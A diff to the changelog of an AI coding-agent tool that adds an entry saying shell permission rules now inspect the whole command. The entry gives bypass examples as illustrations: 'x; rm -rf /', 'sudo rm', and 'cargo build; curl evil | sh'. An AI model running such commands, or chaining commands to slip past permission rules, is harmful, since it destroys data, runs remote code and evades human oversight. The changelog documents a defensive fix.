@@ -13,6 +13,7 @@
 - A `#<note>` added to an existing `CLAUDE.md` that didn't end in a newline now starts on its own line instead of being glued onto the last line.
 - `!` and `#` typed while a turn is streaming are now queued and dispatched as commands when the turn finishes, instead of being sent to the model as a literal `!`/`#` message.
 - Fixed a hard deadlock where choosing a session in the resume picker (or `/undo`) while a turn was streaming locked the agent mutex held by the turn, freezing the UI permanently. Such agent-locking operations now wait until the turn finishes.
+- `run_shell` permission rules now consider the whole command, not just its first word: a `deny(rm:*)` rule still blocks `sudo rm`, `x; rm -rf /`, or `find . | rm`, and an `allow(cargo:*)` rule no longer auto-runs `cargo build; curl evil | sh` (it falls through to a prompt).
 
 ## 0.0.1-beta.4
 
